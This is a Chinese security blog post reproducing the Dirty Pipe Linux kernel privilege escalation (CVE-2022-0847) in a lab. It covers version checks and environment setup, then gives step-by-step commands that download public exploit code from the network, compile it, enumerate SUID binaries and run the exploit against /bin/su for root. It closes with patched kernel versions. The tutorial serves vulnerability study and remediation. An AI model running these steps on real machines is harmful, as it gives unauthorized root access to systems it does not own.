> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6VebZCKAv6kkmQme4GCQ_w)

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/lvTqB4HLwG1QbrelrbibfuibsYXh0mibqpBLk0fK2fTaXIeggv0s0RSx6llWawgT2U03mn6ibsIY0rX9AtStZjZtFw/0?wx_fmt=png) ** TeamsSix ** 我的个人博客：teamssix.com 218篇原创内容   公众号

0x00 前言  

==========

CVSS 评分：7.8

影响范围：5.8 <= Linux 内核版本 < 5.16.11 / 5.15.25 / 5.10.102

RT 通过 CVE-2022-0847 可覆盖重写任意可读文件中的数据，可将普通权限的用户提升到特权 root

这个漏洞作者将其命名为了 Dirty Pipe，一看到这名字讲道理就让人想到了 Dirty Cow，这是因为该漏洞的原理比较类似于 Dirty Cow，但这个漏洞更容易被利用。

0x01 漏洞检测
=========

检测的方法很简单，直接 uname -r ，如果  5.8 <= Linux 内核版本 < 5.16.11 / 5.15.25 / 5.10.102 说明可能受到该漏洞的影响。

![图片](https://mmbiz.qpic.cn/mmbiz_png/lvTqB4HLwG3gxcqJCTbHeWW26TyqGPkiaESaXicUNlcibFYBibic9OLjBnrIUyLd6BgvGPAnxdjuhIdW82aVibfpmC8A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

0x02 环境搭建
=========

> 建议在搭建环境前，先打好快照

环境依赖：

*   Ubuntu 16.04 或 18.04（推荐）
    
*   Python >= 3.6 (不支持Python 2.x！)
    
*   pip3
    

```


```


`git clone https://github.com/brant-ruan/metarget.git``cd metarget/``pip3 install -r requirements.txt``sudo ./metarget cnv install cve-2022-0847`


```




```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lvTqB4HLwG3gxcqJCTbHeWW26TyqGPkiaozZIafbdIbZ2PeneRADt5Wicz7SIS5LhLcibQDYVWlsX6lrtkm4VpxdQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

环境搭建好后，查看当前系统内核

```


```


`uname -r`


```




```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lvTqB4HLwG3gxcqJCTbHeWW26TyqGPkiarSmsUumeGeM8Xvt8S1HPtcOrPxFkF0MoKMSYmbHZqA6HzBU1WhuSQA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

可以看到系统内核已经是 5.8 的了，说明是可能受到该漏洞的影响了。

0x03 漏洞复现
=========

方法一：CVE-2022-0847-DirtyPipe-Exploit
-----------------------------------

把 POC git 下来

```


```


`git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit``cd CVE-2022-0847-DirtyPipe-Exploit`


```




```

开始提权

```


```


`gcc exploit.c -o exploit``./exploit`


```




```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lvTqB4HLwG3gxcqJCTbHeWW26TyqGPkiaIjx7s8a9YFamVDSibNYWkd51DHCMg03Ts8UeGZIXmH07Du8yOCEg0sA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

我这里提示 su: must be run from a terminal，没提权成功。

根据作者的解释，他的电脑快没电了，所以暂时还没时间解决这个问题，这 ……

![图片](https://mmbiz.qpic.cn/mmbiz_png/lvTqB4HLwG3gxcqJCTbHeWW26TyqGPkiaiaE0DRibO6j1ldp0eFZ4xBag4iburvqibVeStRva0IabyzBticcCkIicH0SQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

方法二：dirtypipez.c
----------------

后来看 p 牛说到了网上的其他 POC，下面这个 POC 测试了一下，是可以提权的

```


```


`mkdir dirtypipez``cd dirtypipez``wget https://haxx.in/files/dirtypipez.c``gcc dirtypipez.c -o dirtypipez`


```




```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lvTqB4HLwG3gxcqJCTbHeWW26TyqGPkiaLo57wzsrXVvSlibfr1A7eLdokJGO9V0AiatUocP2f0JWXlbDEYTPm7gA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

这个 POC 需要事先找到一个具有 SUID 权限的可执行文件，然后利用这个文件进行提权

使用以下命令可以找到这类文件

```


```


`find / -perm -u=s -type f 2>/dev/null`


```




```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lvTqB4HLwG3gxcqJCTbHeWW26TyqGPkiaoVngc6kZyzKmamHGw9Wql5yMF8cA335UEbQ6oJFEFA8yZ1fbOPAfIA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

这里就以 /bin/su 为例了，直接 ./dirtypipez 跟上具有 SUID 权限的文件即可提权

```


```


`./dirtypipez /bin/su`


```




```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lvTqB4HLwG3gxcqJCTbHeWW26TyqGPkiaFAib6Mib4XJV3OuEkn2ToF4n1vtWlLN4ibI8hwnzKWT0DVUZSrJZ6KMgw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

0x04 漏洞修复
=========

更新升级 Linux 内核到以下安全版本：

*   Linux 内核 >= 5.16.11
    
*   Linux 内核 >= 5.15.25
    
*   Linux 内核 >= 5.10.102
    

* * *

往期推荐

[云安全 | 容器基础设施所面临的风险学习](http://mp.weixin.qq.com/s?__biz=MzI5Mzk5NTIwMg==&mid=2247486742&idx=1&sn=b629f440dbbeeda888f145ab99e4f978&chksm=ec68dabbdb1f53ad82eb09092da01efbe129ca3493ebbeb3a50f5301bf02725a1830bf4927ee&scene=21#wechat_redirect)  

[云安全 | 云原生安全是什么？](http://mp.weixin.qq.com/s?__biz=MzI5Mzk5NTIwMg==&mid=2247486729&idx=1&sn=97fc7a772693bd1754180090b8194229&chksm=ec68daa4db1f53b2df5cba3145619308b49ff45cf05ea8d444fe5a03da28d8965e40a64ac3a6&scene=21#wechat_redirect)

[一键创建隐藏账号](http://mp.weixin.qq.com/s?__biz=MzI5Mzk5NTIwMg==&mid=2247486694&idx=1&sn=4b71e14dd14763a4c0b38e6aa25d1a68&chksm=ec68db4bdb1f525dd9a35fd431759a9e4e19dd84a1f4e43fb8c2987753b60955e948bee21dbe&scene=21#wechat_redirect)

> 原文链接：
> 
> https://teamssix.com/220308-120008.html
> 
> 参考文章：
> 
> https://t.zsxq.com/imaqj2V
> 
> [https://mp.weixin.qq.com/s/b8DmtIerXuoC7f3nqaOVIw](https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247488603&idx=1&sn=964903ac19d00fd62019424062b5b362&scene=21#wechat_redirect)
> 
> https://access.redhat.com/security/cve/cve-2022-0847

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

 ![](http://mmbiz.qpic.cn/mmbiz_png/lvTqB4HLwG1QbrelrbibfuibsYXh0mibqpBLk0fK2fTaXIeggv0s0RSx6llWawgT2U03mn6ibsIY0rX9AtStZjZtFw/0?wx_fmt=png) ** TeamsSix ** 我的个人博客：teamssix.com 218篇原创内容   公众号